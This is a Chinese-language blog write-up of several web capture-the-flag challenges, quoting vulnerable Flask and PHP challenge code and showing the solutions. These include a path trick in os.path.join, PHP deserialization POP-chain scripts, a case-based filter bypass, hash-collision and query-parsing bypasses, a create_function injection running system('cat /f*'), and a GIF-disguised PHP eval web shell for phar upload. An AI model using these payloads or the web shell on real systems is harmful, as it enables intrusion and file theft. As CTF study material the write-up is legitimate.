<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157074.png" alt="image-20240719165330997"></p>
<p>找到正确位置，双击然后右键复制即可。随后复制完，直接放进上方url地址中，点击发送，之后会自动url编码，拿着编码后的结果，重新用hakbar发送，将其中的额外字符删掉。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157075.png" alt="image-20240719164714100"></p>
<h2 id="babyupload">babyupload</h2>
<p>没见过的考点：python中的os.path.join()处理文件上传绝对路径拼接漏洞</p>
<pre><code class="hljs scss">os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.join</span>(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。
然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.join</span>(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。
然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</code></pre>
<p>题目给的关键代码如下</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/upload'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():
    <span class="hljs-keyword">if</span> <span class="hljs-string">'file'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:
        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)
    file = request.files[<span class="hljs-string">'file'</span>]
    <span class="hljs-keyword">if</span> <span class="hljs-string">"."</span> <span class="hljs-keyword">in</span> file.filename:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Bad filename!"</span>, <span class="hljs-number">403</span>
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().<span class="hljs-built_in">hex</span>
    <span class="hljs-keyword">try</span>:
        cur.execute(<span class="hljs-string">"insert into files (id, path) values (?, ?)"</span>, (uid, file.filename,))
    <span class="hljs-keyword">except</span> sqlite3.IntegrityError:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Duplicate file"</span>
    conn.commit()

    file.save(<span class="hljs-string">'uploads/'</span> + file.filename)
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/file/'</span> + uid)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/file/&lt;id&gt;'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
    conn = db()
    cur = conn.cursor()
    cur.execute(<span class="hljs-string">"select path from files where id=?"</span>, (<span class="hljs-built_in">id</span>,))
    res = cur.fetchone()
    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"File not found"</span>, <span class="hljs-number">404</span>

    <span class="hljs-comment"># print(res[0])</span>

    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">"uploads/"</span>, res[<span class="hljs-number">0</span>]), <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">return</span> f.read()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">80</span>)</code></pre>
<p>可以看到这里的os.path.join问题，如果我们传入的文件名是/flag，那之前的基础路径：uploads/就会被删除，直接从/flag开始</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157076.png" alt="image-20240719171859641"></p>
<p>如下图，成功读取flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157077.png" alt="image-20240719171638500"></p>
<h2 id="babyserialize">babyserialize</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"waf.php"</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">"show_me_flag"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">"show_me_flag"</span>){
            <span class="hljs-title function_ invoke__">hint</span>();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>,<span class="hljs-variable">$val</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;fun=<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>];
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fun;
        <span class="hljs-keyword">return</span> <span class="hljs-string">" "</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-title function_ invoke__">checkcheck</span>(<span class="hljs-variable">$this</span>-&gt;txw4ever);
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;txw4ever);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;ext-&gt;<span class="hljs-title function_ invoke__">nisa</span>(<span class="hljs-variable">$this</span>-&gt;x);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun1</span>,<span class="hljs-variable">$arg</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;huang-&gt;fun=<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>];
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;su;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">"TXW4EVER"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">'abc'</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$value</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-string">"sixsixsix"</span>){
            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;a);
        }
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>])){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>]);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}

<span class="hljs-comment">//func checkcheck($data){</span>
<span class="hljs-comment">//  if(preg_match(......)){</span>
<span class="hljs-comment">//      die(something wrong);</span>
<span class="hljs-comment">//  }</span>
<span class="hljs-comment">//}</span>

<span class="hljs-comment">//function hint(){</span>
<span class="hljs-comment">//    echo ".......";</span>
<span class="hljs-comment">//    die();</span>
<span class="hljs-comment">//}</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>链子很容易走通</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">"TXW4EVER"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">'abc'</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$pop</span>-&gt;fun = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ilovetxw</span>();
<span class="hljs-variable">$pop</span>-&gt;fun-&gt;su = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NISA</span>();
<span class="hljs-variable">$pop</span>-&gt;fun-&gt;su-&gt;fun = <span class="hljs-string">'hybcx'</span>;
<span class="hljs-variable">$pop</span>-&gt;fun-&gt;su-&gt;txw4ever = <span class="hljs-string">'aaa'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>不过就是最后的绕waf了，这里system被过滤了，如果你仔细看的话，会发现</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157078.png" alt="image-20240719174009642"></p>
<p>上图这里没有检测大小写，那我们尝试大写看看。如下图，成功绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157079.png" alt="image-20240719174115585"></p>
<h2 id="popchains">popchains</h2>
<pre><code class="hljs php">Happy New Year~ MAKE A WISH
<span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">echo</span> <span class="hljs-string">'Happy New Year~ MAKE A WISH&lt;br&gt;'</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wish'</span>])){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wish'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-comment">/***************************pop your 2022*****************************/</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">'index.php'</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/file|ftp|http|https|gopher|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;page)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"You can Not Enter 2022"</span>;
            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">"index.php"</span>;
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>{
    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>{
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{
        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();
    }
}
<span class="hljs-comment">/**********************Try to See flag.php*****************************/</span></code></pre>
<p>链子如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>{
    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">'/flag'</span>;
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;
}

<span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();
<span class="hljs-variable">$pop</span>-&gt;page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>();
<span class="hljs-variable">$pop</span>-&gt;page-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>();
<span class="hljs-variable">$pop</span>-&gt;page-&gt;<span class="hljs-keyword">string</span>-&gt;effort = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p>一开始根据提示读取flag.php。啥反应没有，看了wp发现都是在读/flag，估计是环境部署问题</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157080.png" alt="image-20240719175414626"></p>
<h2 id="midlevel">midlevel</h2>
<p>根据payload直接读取flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157081.png" alt="image-20240719175747238"></p>
<h2 id="level-up">level-up</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157082.png" alt="image-20240719175909626"></p>
<p>看源代码提示，知道是访问robots.txt</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//here is level 2</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>])){
    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>];
    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"????"</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a2</span>)){
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level3</span>;
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"level 2 failed ..."</span>);
    }

}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着md5强碰撞绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157083.png" alt="image-20240719180206179"></p>
<p>得到第三关</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//here is level 3</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>])){
    <span class="hljs-variable">$a1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array1'</span>];
    <span class="hljs-variable">$a2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'array2'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a1</span> == <span class="hljs-variable">$a2</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"????"</span>);
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$a2</span>)){
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level4</span>;
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"level 3 failed ..."</span>);
    }

}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>接着sha1强碰撞绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157084.png" alt="image-20240719180343034"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//here is last level</span>
    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);

    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_URI'</span>]);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span>[<span class="hljs-string">'query'</span>] == <span class="hljs-string">""</span>){
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"give me a parameter"</span>;
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ |_|20|5f|2e|\./'</span>,<span class="hljs-variable">$str</span>[<span class="hljs-string">'query'</span>])){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"blacklist here"</span>);
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'NI_SA_'</span>] === <span class="hljs-string">"txw4ever"</span>){
        <span class="hljs-keyword">die</span>(<span class="hljs-variable">$level5</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"level 4 failed ..."</span>);
    }

<span class="hljs-meta">?&gt;</span>
give me a parameterlevel <span class="hljs-number">4</span> failed ...</code></pre>
<p>这一关是PHP变量解析绕过，稍微总结一下：</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>.删除空白符
<span class="hljs-number">2</span>.将某些字符转换为下划线（包括空格）</code></pre>
<table>
<thead>
<tr>
<th>User input</th>
<th>Decoded PHP</th>
<th>variable name</th>
</tr>
</thead>
<tbody>
<tr>
<td>%20foo_bar%00</td>
<td>foo_bar</td>
<td>foo_bar</td>
</tr>
<tr>
<td>foo%20bar%00</td>
<td>foo bar</td>
<td>foo_bar</td>
</tr>
<tr>
<td>foo%5bbar</td>
<td>foo[bar</td>
<td>foo_bar</td>
</tr>
</tbody>
</table>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157085.png" alt="image-20240719181359111"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157086.png" alt="image-20240719181419492"></p>
<p>很明显+可以绕过</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//sorry , here is true last level</span>
<span class="hljs-comment">//^_^</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"str.php"</span>;

<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];
<span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^[a-z0-9_]*$/isD'</span>,<span class="hljs-variable">$a</span>)){
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>(<span class="hljs-string">''</span>,<span class="hljs-variable">$b</span>);
}</code></pre>
<p>这个绕过方法，忘记了。总的来说，先说正则表达式的含义：他匹配的是整个字符串，因此只要不满足以下条件的任意一个即可绕过</p>
<ul>
<li>字符串只能包含大小写字母（<code>a-z</code> 和 <code>A-Z</code>）、数字（<code>0-9</code>）和下划线（<code>_</code>）。</li>
<li>字符串可以为空。</li>
<li>字符串的开始和结束位置都必须满足这个字符类的限制。</li>
</ul>
<p>因此payload可以是：</p>
<pre><code class="hljs scss">?<span class="hljs-selector-tag">a</span>=\create_function&amp;<span class="hljs-selector-tag">b</span>=}<span class="hljs-built_in">system</span>('cat /f*');<span class="hljs-comment">//</span></code></pre>
<p>构造思路是：</p>
<p>create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string 𝑐𝑜𝑑𝑒位置。<code>𝑐𝑟𝑒𝑎𝑡𝑒_𝑓𝑢𝑛𝑐𝑡𝑖𝑜𝑛(′a,𝑏′,′𝑟𝑒𝑡𝑢𝑟𝑛"𝑙𝑛(b′,′ln(a) + ln(𝑏)=".𝑙𝑜𝑔(b)=".log(a * $b);');</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda_1</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ln(<span class="hljs-subst">$a</span>) + ln(<span class="hljs-subst">$b</span>) = "</span> . <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-variable">$a</span> * <span class="hljs-variable">$b</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>因此}闭合lambda表达式的{，然后注释符注释掉其他。</p>
<h2 id="bingdundun~">bingdundun~</h2>
<p>文件上传+文件包含</p>
<p>题目提示我们只能上传压缩包或者图片，这里也是看了wp知道是phar协议，其实结合题目的可以上传压缩包类型文件也可以猜到。</p>
<p>由于存在文件包含，那我们直接构造一个压缩包，文件内容如下</p>
<pre><code class="hljs php">GIF89a
<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
